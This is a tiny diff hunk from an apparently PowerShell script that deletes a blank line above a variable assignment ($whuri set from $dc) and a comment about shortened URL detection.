@@ -1,4 +1,3 @@
-
 $whuri = "$dc"
 
 # shortened URL Detection
